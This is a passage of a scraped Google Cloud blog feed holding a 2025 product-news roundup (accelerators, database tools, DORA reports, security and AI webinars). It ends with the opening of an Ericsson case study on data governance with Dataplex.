baseline;\">Google for Startups Accelerator: AI For Energy now accepting applications!<br /></strong><span style=\"vertical-align: baseline;\">Applications are now open for startups headquartered in Europe and Israel, working on solutions for utilities, grid operators and energy developers; solutions for residential and commercial end-use customers focused on demand flexibility and solutions for industrial customers. This equity-free program offers 10 weeks of intensive mentorship and technical project support to startups integrating AI into their core energy services or products. Selected startups will collaborate with a cohort of peer founders and engage with leaders across Google and the energy sector. The curriculum will provide founders with access to AI tools and include workshops on tech and infrastructure, UX and product, growth, sales, leadership and more.</span> <a href=\"https://startup.google.com/programs/accelerator/ai-for-energy/europe-israel/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Learn more and apply</span></a><span style=\"vertical-align: baseline;\"> <strong>before June 30th, 2025</strong>.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Extending Google Cloud Workstations containers to run any GUI based program</strong><span style=\"font-style: italic; vertical-align: baseline;\">Are you having difficulty customizing Google Cloud Workstations to run a GUI program outside of the supported configurations of IDE\u2019s? </span><span style=\"vertical-align: baseline;\">If so, you\u2019re not alone. In this</span> <a href=\"https://medium.com/@roken/extending-google-cloud-workstations-containers-to-run-any-gui-based-program-133d0f905106\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">article</span></a><span style=\"vertical-align: baseline;\"> we discuss how to use the base Workstations Docker image and build it to run a terminal and Google Chrome.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Google Cloud Marketplace simplifies deals and improves economics. </span><strong style=\"vertical-align: baseline;\">Announcing three initiatives that build upon Google Cloud Marketplace as a growth engine for customers and partners</strong><span style=\"vertical-align: baseline;\">:</span></p>\n</li>\n</ul>\n<ol>\n<li>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Improving partner deal economics</strong> to help partners retain more earnings by moving to a variable revenue share model</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Simplifying commit drawdown</strong> for purchases through channel partners</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Unlocking new workloads</strong> with the Marketplace Customer Credit Program incentive<br /><br /></span><a href=\"https://cloud.google.com/blog/topics/partners/upgrades-to-google-cloud-marketplace-for-partners\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Learn more</span></a></p>\n</li>\n</ol>\n</li>\n</ol>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">2025 Google Cloud DORA Awards are now open for submission!</strong><span style=\"vertical-align: baseline;\">Has your team achieved remarkable success through DORA principles? It's time to shine. We're thrilled to announce the launch of the 2025 Google Cloud DORA Awards, celebrating outstanding achievements in technology delivery and operational performance. </span><a href=\"https://cloud.google.com/awards/devops\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Submit</span></a><span style=\"vertical-align: baseline;\"> your story today!</span></li>\n</ul>\n<h3>May 5 - May 9</h3>\n<ul>\n<li><strong>AI assisted development with MCP Toolbox for Databases<br /></strong>We are excited to announce new updates to MCP Toolbox for Databases. Developers can now use Toolbox from their preferred IDE, such as Cursor, Windsurf, Claude Desktop, more and leverage our new pre-built tools such as execute_sql and list_tables for AI-assisted development with Cloud SQL for PostgreSQL, AlloyDB and self-managed PostgreSQL.\n<ul>\n<li>Get Started with <a href=\"https://googleapis.github.io/genai-toolbox/getting-started/mcp_quickstart/\" rel=\"noopener\" target=\"_blank\">MCP Toolbox for Databases</a></li>\n</ul>\n</li>\n</ul>\n<h3>Apr 28 - May 2</h3>\n<ul>\n<li><strong>Itching to build AI agents? Join the Agent Development Kit Hackathon with Google Cloud!</strong> Use ADK to build multi-agent systems to solve challenges around complex processes, customer engagement, content creation, and more. Compete for over $50,000 in prizes and demonstrate the power of multi-agent systems with ADK and Google Cloud.\n<ul>\n<li>Submissions are open from May 12, 2025 to June 23, 2025.</li>\n<li>Learn more and register <a href=\"http://googlecloudmultiagents.devpost.com/\" rel=\"noopener\" target=\"_blank\">here</a><span>.</span></li>\n</ul>\n</li>\n</ul>\n<h3>Apr 21 - Apr 25</h3>\n<ul>\n<li>\n<p><strong>Iceland\u2019s Magic: Reliving Solo Adventure through Gemini<br /></strong>Embark on a journey through Iceland's stunning landscapes, as experienced on Gauti's Icelandic solo trip. From majestic waterfalls to the enchanting Northern Lights, Gautami then takes these cherished memories a step further, using Google's multi-modal AI, specifically Veo2, to bring static photos to life. Discover how technology can enhance and dynamically relive travel experiences, turning precious moments into immersive short videos. This innovative approach showcases the power of AI in preserving and enriching our memories from Gauti's unforgettable Icelandic travels. <a href=\"https://medium.com/@gautami_nadkarni_cloud/icelands-magic-reliving-my-solo-adventure-through-gemini-ai-d61470b9945c\" rel=\"noopener\" target=\"_blank\">Read more</a>.</p>\n</li>\n<li><strong>Introducing ETLC - A Context-First Approach to Data Processing in the Generative AI Era:</strong> As organizations adopt generative AI, data pipelines often lack the dynamic context needed. This paper introduces ETLC (Extract, Transform, Load, Contextualize), adding semantic, relational, operational, environmental, and behavioral context. ETLC enables Dynamic Context Engines for context-aware RAG, AI co-pilots, and agentic systems. It works with standards like the Model Context Protocol (MCP) for effective context delivery, ensuring business-specific AI outputs. <a href=\"https://services.google.com/fh/files/blogs/etlc_full_paper.pdf\" rel=\"noopener\" target=\"_blank\">Read the full paper</a>.</li>\n</ul>\n<h3>Apr 14 - Apr 18</h3>\n<ul>\n<li>\n<p><strong>What\u2019s new in Database Center</strong><br />With general availability,\u00a0<a href=\"https://cloud.google.com/database-center/docs/overview\" rel=\"noopener\" target=\"_blank\">Database Center</a>\u00a0now provides enhanced performance and health monitoring for all Google Cloud databases, including Cloud SQL, AlloyDB, Spanner, Bigtable, Memorystore, and Firestore. It delivers richer metrics and actionable recommendations, helps you to optimize database performance and reliability, and customize your experience. Database Center also leverages Gemini to deliver assistive performance troubleshooting experience. Finally, you can track the weekly progress of your database inventory and health issues.\u00a0</p>\n<p>Get started with Database Center today</p>\n<p><span id=\"m_-5735904157727247169gmail-docs-internal-guid-47cc0dbe-7fff-37b6-3106-7a6506e08d8f\"></span></p>\n<ul>\n<li>\n<p><a href=\"https://console.cloud.google.com/database-center\">Access Database Center in Google Cloud console </a></p>\n</li>\n<li>\n<p><a href=\"https://cloud.google.com/database-center/docs/overview\">Review the documentation to learn more</a></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3>Apr 7 - Apr 11</h3>\n<ul>\n<li>This week, at Google Cloud Next, we announced an expansion of Bigtable's SQL capabilities and introduced continuous materialized views. Bigtable SQL and continuous materialized views empower users to build fully-managed, real-time application backends using familiar SQL syntax, including specialized features that preserve Bigtable's flexible schema \u2014 a vital aspect of real-time applications. Read more in this <a href=\"https://cloud.google.com/blog/products/databases/accelerate-your-analytics-with-new-bigtable-sql-capabilities\" rel=\"noopener\" target=\"_blank\">blog</a>.</li>\n<li><strong>DORA Report Goes Global: Now Available in 9 Languages!<br /></strong>Unlock the power of DevOps insights with the DORA report, now available in 9 languages, including Chinese, French, Japanese, Korean, Portuguese, and Spanish. Global teams can now optimize their practices, benchmark performance, and gain localized insights to accelerate software delivery. The report highlights the significant impact of AI on software development, explores platform engineering\u2019s promises and challenges, and emphasizes user-centricity and stable priorities for organizational success. <a href=\"https://cloud.google.com/devops/state-of-devops\" rel=\"noopener\" target=\"_blank\">Download the DORA Report Now</a></li>\n<li><strong>New Google Cloud State of AI Infrastructure Report Released<br /></strong>Is your infrastructure ready for AI? The 2025 State of AI Infrastructure Report is here, packed with insights from 500+ global tech leaders. Discover the strategies and challenges shaping the future of AI and learn how to build a robust, secure, and cost-effective AI-ready cloud. Download the report and enhance your AI investments today. <a href=\"https://cloud.google.com/resources/content/state-of-ai-infrastructure?hl=en\" rel=\"noopener\" target=\"_blank\">Download the 2025 AI infrastructure report now</a></li>\n<li><strong>Google Cloud and Oracle Accelerate Enterprise Modernization with New Regions, Expanded Capabilities<br /></strong>Announcing major Oracle Database@Google Cloud enhancements! We're launching the flexible Oracle Base Database Service and powerful new Exadata X11M machines. We're rapidly expanding to 20 global locations, adding new Partner Cross-Cloud Interconnect options, and introducing Cross-Region Disaster Recovery for Autonomous Database. Benefit from enhanced Google Cloud Monitoring, integrated Backup &amp; DR, plus expanded support for enterprise applications like SAP. Customers can run critical Oracle workloads with more power, resilience, and seamless Google Cloud integration. Get started right away from your Google Cloud Console or <a href=\"https://cloud.google.com/solutions/oracle\" rel=\"noopener\" target=\"_blank\">learn more here</a><span>.</span></li>\n</ul>\n<h3>Mar 17 - Mar 21</h3>\n<ul>\n<li><strong>Cloud CISO Perspectives: 5 tips for secure AI success </strong>-<strong> </strong>To coincide with new AI Protection capabilities in Security Command Center, we\u2019re offering 5 tips to set up your organization for <a href=\"https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-5-tips-secure-ai-success\" rel=\"noopener\" target=\"_blank\">secure AI success</a>.</li>\n<li><strong>Our 4-6-3 rule for strengthening security ties to business: </strong>The desire to quickly transform a business can push leaders to neglect security and resilience, but prioritizing security can unlock value. Follow these 4 principles, 6 steps, and 3 metrics to use a security-first mindset to <a href=\"https://cloud.google.com/transform/our-4-6-3-rule-strengthening-security-ties-business/\" rel=\"noopener\" target=\"_blank\">drive business results</a>.</li>\n<li><strong>The new Data Protection Tab in Compute Engine ensures your resources are protected:</strong> Not only have we co-located your backup options, but we also have introduced smart default data protection for any Compute Engine instance created via Cloud Console. Here\u2019s <a href=\"https://cloud.google.com/blog/products/storage-data-transfer/console-gains-data-protection-interface-for-backup-and-dr?e=48754805\" rel=\"noopener\" target=\"_blank\">how it works.</a></li>\n<li><strong>DORA report - Impact of Generative AI in Software Development<br /></strong>This report builds on and extends DORA's research into AI. We review the current landscape of AI adoption, look into its impact on developers and organizations, and outline a framework and practical guidance for successful integration, measurement, and continuous improvement. <a href=\"https://cloud.google.com/resources/content/dora-impact-of-gen-ai-software-development\" rel=\"noopener\" target=\"_blank\">Download the report</a>!</li>\n</ul>\n<h3>Mar 10 - Mar 14</h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Protecting your APIs from OWASP\u2019s top 10 security threats</strong><span style=\"vertical-align: baseline;\">: We compare OWASP\u2019s top 10 API security threats list to the security capabilities of Apigee. Here\u2019s how</span> <a href=\"https://cloud.google.com/blog/products/identity-security/protecting-your-apis-from-owasps-top-10-security-threats\"><span style=\"text-decoration: underline; vertical-align: baseline;\">we hold up</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Project Shield makes it easier to sign up, set up, automate DDoS protection</strong>: It\u2019s now easier than ever for vulnerable organizations to apply to Project Shield, set up protection, and automate their defenses.</span> <a href=\"https://cloud.google.com/blog/products/identity-security/project-shield-makes-it-easier-to-sign-up-set-up-automate-ddos-protection\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Here\u2019s how</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">How Google Does It: Red teaming at Google scale </strong><span style=\"vertical-align: baseline;\">-\u00a0The best red teams are creative sparring partners for defenders, probing for weaknesses. Here\u2019s how we do</span> <a href=\"https://cloud.google.com/transform/how-google-does-it-red-teaming-at-scale/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">red teaming at Google scale</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/solutions/ai-hypercomputer?e=48754805\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AI Hypercomputer</strong></a><strong style=\"vertical-align: baseline;\"> is a fully integrated supercomputing architecture for AI workloads \u2013 and it\u2019s easier to use than you think</strong><span style=\"vertical-align: baseline;\">. Check out <a href=\"https://cloud.google.com/blog/products/ai-machine-learning/ai-hypercomputer-4-use-cases-tutorials-and-guides\">this blog</a>, where we break down four common use cases, including reference architectures and tutorials, representing just a few of the many ways you can use AI Hypercomputer today.\u00a0</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Transform Business Operations with Gemini-Powered SMS-iT CRM on Google Cloud:</strong><span style=\"vertical-align: baseline;\"> SMS-iT CRM on Google Cloud unifies SMS, MMS, email, voice, and 22+ social channels into one Smart Inbox. Enjoy real-time voice interactions, AI chatbots, immersive video conferencing, AI tutors, AI operator, and unlimited AI agents for lead management. Benefit from revenue-driven automation, intelligent appointment scheduling with secure payments, dynamic marketing tools, robust analytics, and an integrated ERP suite that streamlines operations from project management to commerce. This comprehensive solution is designed to eliminate inefficiencies and drive exponential growth for your business. </span><a href=\"https://console.cloud.google.com/marketplace/product/smsit-public/sms-it-crm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Experience the Future Today</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li style=\"vertical-align: baseline;\">\n<p><strong><span style=\"vertical-align: baseline;\">Join us for a new webinar,</span> </strong><a href=\"https://event.on24.com/wcc/r/4863138/B9EF106CA3251057A83169D2F984A50D?partnerref=google\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"><strong>Smarter CX, Bigger Impact: Transforming Customer Experiences with Google AI</strong></span></a><span style=\"vertical-align: baseline;\">, where we'll explore how Google AI can help you deliver exceptional customer experiences and drive business growth. You'll learn how to:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Transform Customer Experiences:\u00a0 With conversational AI agents that provide personalized customer engagements.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Improve Employee Productivity &amp; Experience: With AI that monitors customers sentiment in real-time, and assists customer service representatives to raise customer satisfaction scores.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Deliver Value Faster: With\u00a0 30+ data connectors and 70+ action connectors to the most commonly used CRMs and information systems.<br /><br /></span><span style=\"vertical-align: baseline;\">Register</span> <a href=\"https://event.on24.com/wcc/r/4863138/B9EF106CA3251057A83169D2F984A50D?partnerref=google\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a></p>\n</li>\n</ul>\n</ul>\n<h3>Mar 3 - Mar 7</h3>\n<ul>\n<li><a href=\"https://cloud.google.com/blog/products/infrastructure/google-cloud-launches-42nd-cloud-region-in-sweden\" rel=\"noopener\" target=\"_blank\"><strong>Hej Sverige! Google Cloud launches new region in Sweden</strong></a> - More than just another region, it represents a significant investment in Sweden's future and Google\u2019s ongoing commitment to empowering businesses and individuals with the power of the cloud. This new region, our 42nd globally and 13th in Europe, opens doors to opportunities for innovation, sustainability, and growth \u2014 within Sweden and across the globe. We're excited about the potential it holds for your digital transformations and AI aspirations.</li>\n<li><strong>[March 11th webinar] Building infrastructure for the Generative AI era: insights from the 2025 State of AI Infra report: </strong>Staying at the forefront of AI requires an infrastructure built for AI. Generative AI is revolutionizing industries, but it demands a new approach to infrastructure. In this webinar, we'll unveil insights from Google Cloud's latest research report and equip tech leaders with a practical roadmap for building and managing gen AI workloads, including: the top gen AI use cases driving the greatest return on investment, current infrastructure approaches and preferences for Generative AI workloads, the impact of performance benchmarks, scalability, and security on cloud provider selection. <a href=\"https://cloudonair.withgoogle.com/events/insights-from-the-2025-google-research-report\" rel=\"noopener\" target=\"_blank\">Register today</a>.</li>\n<li><strong>Cloud CISO Perspectives: Why PQC is the next Y2K, and what you can do about it</strong>: Much like Y2K 25 years ago, post-quantum cryptography may seem like the future\u2019s problem \u2014 but it will soon be ours if IT doesn\u2019t move faster, explains Google Cloud\u2019s Christiane Peters. Here's how business leaders can <a href=\"https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-prepare-early-for-PQC-resilient-cryptographic-threats\" rel=\"noopener\" target=\"_blank\">get going on PQC prep</a>.</li>\n<li><strong>How Google Does It: Using threat intelligence to uncover and track cybercrime</strong> \u2014 How does Google use threat intelligence to uncover and track cybercrime? Google Threat Intelligence Group\u2019s Kimberly Goody takes you <a href=\"https://cloud.google.com/transform/how-google-does-it-threat-intelligence-uncover-track-cybercrime/\" rel=\"noopener\" target=\"_blank\">behind the scenes</a>.</li>\n<li><strong>5 key cybersecurity strategies for manufacturing executives</strong> \u2014 Here are five key governance strategies that can help manufacturing executives build a robust cybersecurity posture and better mitigate the <a href=\"https://cloud.google.com/transform/5-key-cybersecurity-strategies-manufacturing-executives\" rel=\"noopener\" target=\"_blank\">evolving risks they face</a>.</li>\n<li><strong><a href=\"https://cloud.google.com/datastream?e=48754805&amp;hl=en\" rel=\"noopener\" target=\"_blank\">Datastream</a> now offers Salesforce source in Preview.</strong>\u00a0Instantly connect, capture changes, and deliver data to <strong>BigQuery</strong>, <strong>Cloud Storage</strong>, etc. Power real-time insights with flexible authentication and robust backfill/CDC. Unlock Salesforce data for Google Cloud analytics, reporting, and generative AI. Read the <a href=\"https://cloud.google.com/datastream/docs/sources-salesforce\">documentation</a> to learn more.</li>\n<li><strong>Find out how much you can save with Spanner - </strong>According to a recent Forrester Total Economic Impact\u2122 study, by migrating to Spanner from a traditional database, a $1 billion per year B2C organization could get a 132% return on investment (ROI) with a 9-month payback period, and realize $7.74M in total benefits over the three years. To see how, check out <a href=\"https://cloud.google.com/blog/products/databases/forrester-tei-study-on-spanner-shows-benefits-and-cost-savings?e=48754805\" rel=\"noopener\" target=\"_blank\">the blog</a> or download <a href=\"https://cloud.google.com/resources/content/forrester-spanner-tei-study?e=48754805\" rel=\"noopener\" target=\"_blank\">the report</a>.\u00a0</li>\n<li><strong>GenAI Observability for Developers series</strong>: The Google Cloud DevRel team hosted a four-part webinar series, \"Gen AI Observability for Developers,\" demonstrating observability best practices in four programming languages. Participants learned to instrument a sample application deployed on Cloud Run for auditing Vertex AI usage, writing structured logs, tracking performance metrics, and utilizing OpenTelemetry for tracing. The series covered Go, Java, NodeJS, and Python, using common logging and web frameworks. Missed it? Recordings and hands-on codelabs are available to guide you at:\n<ul>\n<li><a href=\"https://cloudonair.withgoogle.com/events/gen-ai-observability-for-go-developers\" rel=\"noopener\" target=\"_blank\">Gen AI O11y for Go Developers</a></li>\n<li><a href=\"https://cloudonair.withgoogle.com/events/gen-ai-observability-for-java-developers\" rel=\"noopener\" target=\"_blank\">Gen AI O11y for Java Developers</a></li>\n<li><a href=\"https://cloudonair.withgoogle.com/events/gen-ai-observability-for-javascript-developers\" rel=\"noopener\" target=\"_blank\">Gen AI O11y for NodeJS Developers</a></li>\n<li><a href=\"https://cloudonair.withgoogle.com/events/gen-ai-observability-for-python-developers\" rel=\"noopener\" target=\"_blank\">Gen AI O11y for Python Developers</a><br /><br />Stay tuned for future events at <a href=\"https://cloudonair.withgoogle.com/\" rel=\"noopener\" target=\"_blank\">cloudonair.withgoogle.com.</a></li>\n</ul>\n</li>\n</ul>\n<h3>Feb 24 - Feb 28</h3>\n<ul>\n<li><strong>Rethinking 5G: </strong>Ericsson and Google Cloud are collaborating to redefine 5G mobile core networks with a focus on autonomous operations. By leveraging AI and cloud infrastructure, we aim to enhance efficiency, security, and innovation in the telecommunications industry. This partnership addresses the increasing demands of 5G and connected devices, paving the way for a more dynamic and intelligent network future, and setting the stage for next-generation technologies like 6G. Learn more <a href=\"https://cloud.google.com/blog/topics/telecommunications/ericsson-and-google-cloud-collaborating-on-5g\" rel=\"noopener\" target=\"_blank\">here</a><span>.</span></li>\n<li><span>Adopt a principles-centered <a href=\"https://cloud.google.com/blog/products/application-modernization/well-architected-framework-to-accelerate-your-cloud-journey\" rel=\"noopener\" target=\"_blank\">well-architected framework</a> to design, build, deploy, and manage Google Cloud workloads that are secure, resilient, efficient, cost-efficient, and high-performing. Also get industry and technology-focused well-architected framework guidance, like for AI and ML workloads.</span></li>\n</ul>\n<h3>Feb 17 - Feb 21</h3>\n<ul>\n<li><strong>Easier Default Backup Configuration for Compute Engine Instances</strong> - The Create a Compute Instance page in the Google Cloud console now includes enhanced <strong>data protection options</strong> to streamline backup and replication configurations. By default, an option to back up data is pre-selected, ensuring recoverability in case of unforeseen events. Learn more <a href=\"https://cloud.google.com/compute/docs/disks/default-backup\" rel=\"noopener\" target=\"_blank\">here</a>.</li>\n</ul>\n<h3>Feb 10 - Feb 14</h3>\n<ul>\n<li><strong>[Webinar] Generative AI for Software Delivery: Strategies for IT Leaders: </strong>Generative AI is transforming the way organizations build and deploy software. <strong>Join Google Cloud experts on February 26th</strong> to learn how organizations can leverage AI to streamline their software delivery, including: the role of gen AI in software development, how to use gen AI for migration and modernization, best practices for integrating gen AI into your existing workflows, and real-world applications of gen AI in software modernization and migration through live demos. <a href=\"https://cloudonair.withgoogle.com/events/generative-ai-for-software-delivery\" rel=\"noopener\" target=\"_blank\">Register here.</a></li>\n</ul>\n<h3>Feb 3 - Feb 7</h3>\n<ul>\n<li>SQL is great but not perfect. We\u2019d like to invite you to reimagine how you write SQL with Google\u2019s newest invention: pipe syntax (public available to all BigQuery and Cloud Logging users). This new extension to GoogleSQL brings a modern, streamlined approach to data analysis. Now you can write simpler, shorter and more flexible queries for faster insights. Check out this <a href=\"https://www.youtube.com/watch?v=mW2CLYr6w4M\" rel=\"noopener\" target=\"_blank\">video</a> to learn more.\u00a0</li>\n</ul>\n<h3>Jan 13 - Jan 17</h3>\n<ul>\n<li><strong>C4A virtual machines with Titanium SSD</strong>\u2014the first Axion-based, general-purpose instance\u00a0with Titanium SSD<strong>, </strong>are now generally available.\u00a0C4A virtual machines with Titanium SSDs are custom designed by Google for cloud workloads that require real-time data processing, with low-latency and high-throughput storage performance. Titanium SSDs enhance storage security and performance while offloading local storage processing to free up CPU resources. Learn more <a href=\"https://cloud.google.com/blog/products/compute/first-google-axion-processor-c4a-now-ga-with-titanium-ssd\" rel=\"noopener\" target=\"_blank\">here</a>.</li>\n</ul>\n<h3>Jan 6 - Jan 10</h3>\n<div>\n<ul>\n<li><strong>A look back on a year of Earth Engine advancements: </strong>2024 was a landmark year for Google Earth Engine, marked by significant advancements in platform management, cloud integration, and core functionality and increased interoperability between Google Cloud tools and services. Here\u2019s a <a href=\"https://cloud.google.com/blog/topics/sustainability/look-back-at-a-year-of-earth-engine-advancements\" rel=\"noopener\" target=\"_blank\">round up of 2024\u2019s top Earth Engine launches</a><span>.</span></li>\n<li><strong>Get early access to our new Solar API data and features: </strong>We're excited to announce that we are working on 2 significant expansions to the Solar API from Google Maps Platform and are looking for trusted testers to help us bring them to market. These include improved and expanded buildings coverage and greater insights for existing solar installations with Detected Arrays. <a href=\"https://mapsplatform.google.com/resources/blog/early-access-unlock-expanded-coverage-and-greater-insights-in-the-solar-api/?linkId=12083502\" rel=\"noopener\" target=\"_blank\">Learn more.</a></li>\n<li><a href=\"https://startup.google.com/programs/accelerator/women-founders/europe\" rel=\"noopener\" target=\"_blank\"><strong>Google for Startups Accelerator: Women Founders</strong></a> applications are now open for women-led startups headquartered in Europe and Israel. <a href=\"https://cloud.google.com/blog/topics/startups/google-for-startups-accelerator-for-women-led-tech-startups\" rel=\"noopener\" target=\"_blank\">Discover</a> why this program could be the perfect fit for your startup and apply before January 24th, 2025.</li>\n<li><strong>Best of N: Generating High-Quality Grounded Answers with Multiple Drafts - </strong>We are excited to announce that <a href=\"https://cloud.google.com/generative-ai-app-builder/docs/check-grounding\" rel=\"noopener\" target=\"_blank\">Check Grounding API</a> has released a new helpfulness score feature. Building on top of our existing groundedness score, we now enable users to implement Best of N to improve RAG response quality without requiring extensive model retraining. Learn more about Best of N and how it can help you <a href=\"https://medium.com/@amattapalli/best-of-n-generating-high-quality-grounded-answers-with-multiple-drafts-396101ac04d3\" rel=\"noopener\" target=\"_blank\">here.</a></li>\n</ul>\n</div></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/telecommunications/how-ericsson-achieves-data-integrity-and-superior-governance-with-dataplex/",
        "title": "How Ericsson achieves data integrity and superior governance with Dataplex",
        "thumbnail": null,
        "author": "Akanksha Bhagwanani",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Data is the engine of modern telecommunications. For Ericsson's Managed Services, which operates a global network of more than 710,000 sites, harnessing this data is not just an advantage, it's essential for business growth and leadership. To power the future of its </span><a href=\"https://www.ericsson.com/en/ai/autonomous-networks\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">autonomous network operations</span></a><span style=\"vertical-align: baseline;\"> and deliver on its strategic priorities, Ericsson has been on a transformative data journey with governance at the center of its strategy.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ericsson moved from foundational practices to a sophisticated, business-enabling data governance framework using </span><a href=\"https://cloud.google.com/dataplex\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud\u2019s Dataplex Universal Catalog</span></a><span style=\"vertical-align: baseline;\">, turning data from a simple resource into a strategic asset.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">From a new operating model to a new data mindset</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Ericsson\u2019s journey began in 2019 with the launch of the </span><a href=\"https://www.ericsson.com/en/managed-services/ericsson-operation-engine\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Ericsson Operations Engine</span></a><span style=\"vertical-align: baseline;\"> (EOE), a groundbreaking, AI-powered operating model for managing complex, multi-vendor telecom networks. The EOE made one thing clear: to succeed,</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">data had to be at the core of everything.</span></p>\n<p><span style=\"vertical-align: baseline;\">This realization led Ericsson to develop its first enterprise data strategy, which established the core principles for how data is collected, managed and governed. However, building a strategy is one thing \u2014 operationalizing it at scale is another.</span></p>\n<p><span style=\"vertical-align: baseline;\">To move beyond theory to address real-world challenges, Ericsson needed to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Build trust:</strong><span style=\"vertical-align: baseline;\"> Provide discoverable, clean, reliable, and well-understood data to the teams deploying analytics, AI, and automation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Balance defense and offense:</strong><span style=\"vertical-align: baseline;\"> Ensure compliance with contracts and regulations (defensive governance) while empowering teams to innovate and create value from data (offensive governance).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Ensure data integrity: </strong><span style=\"vertical-align: baseline;\">Ericsson users see data integrity as the core principle for effective data management. Data quality, which is essential for reliable, trustworthy data throughout its lifecycle, is a key quality indicator (KQI) for measuring effectiveness. Any quality deviations must be managed like a high-priority incident with clear Service Level Agreements (SLA) for restoration and resolution.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To realize this vision, Ericsson sought a platform that could match its ambition for global-scale governance and innovation \u2014 and Dataplex Universal Catalog emerged as the ideal choice.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ericsson made its selection based on four key criteria.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">First, its capabilities aligned perfectly with Ericsson\u2019s requirements for cloud-native transformation, business principles, and a long-term governance vision, underpinned by Ericsson\u2019s strategic partnership with Google Cloud. Second, from a technical standpoint, Dataplex provided a tightly integrated, end-to-end ecosystem as a native Google Cloud solution, translating to faster time-to-market for use cases and reduced integration overhead.</span></p>\n<p><span style=\"vertical-align: baseline;\">Third, the platform offered a practical operating model that enabled quick learning, adaptation, and self-sufficiency, supporting an agile approach where Ericsson could fail fast and iterate. Finally, as an existing Google Cloud customer, Dataplex presented a clear and manageable Total Cost of Ownership (TCO), serving as a natural extension of Ericsson\u2019s existing environment and providing a clear, manageable cost profile for both storage and compute extension with governance capabilities.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Putting governance into practice: Key capabilities in action</strong></h3>\n<p><span style=\"vertical-align: baseline;\">With Dataplex Universal Catalog as the governance foundation, Ericsson began implementing the core pillars of its governance program, moving from manual processes to an automated, intelligent data fabric.</span></p>\n<p><span style=\"vertical-align: baseline;\">More specifically, Ericsson established a unified business vocabulary within Dataplex. This transformative first step eliminated ambiguity and ensured their teams \u2014 from data scientists to data analysts \u2014 were speaking the same language. These glossaries also captured tribal knowledge and became the foundation for creating trusted data products.</span></p>\n<p><span style=\"vertical-align: baseline;\">In addition, Dataplex's catalog is at the heart of the data governance solution, making data discovery simple and intuitive for authorized users. Ericsson uses its tagging capabilities to enrich the data assets with critical metadata, including data classification, ownership, retention policies, and sensitivity labels. Dataplex\u2019s ability to automatically visualize data lineage, down to the column level, is another game-changer. Different data personas can instantly understand a dataset's origin and its downstream impact, dramatically increasing trust and reducing investigation time. </span><span style=\"vertical-align: baseline;\">Furthermore, trustworthy AI models are built on high-quality data. For proactive data quality, Ericsson uses Dataplex to run automated quality checks and profiles on its data pipelines. When a quality rule is breached, an alert is automatically triggered, creating an incident in its service management platform to ensure data issues are treated with the urgency they deserve.</span></p>\n<p><span style=\"vertical-align: baseline;\">These capabilities are all underpinned by Ericsson's</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">Data Operating Model (DOM), a framework that defines the policies, people, processes, and technology needed to translate its data strategy into tangible value, comprising several facets when working with data.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure 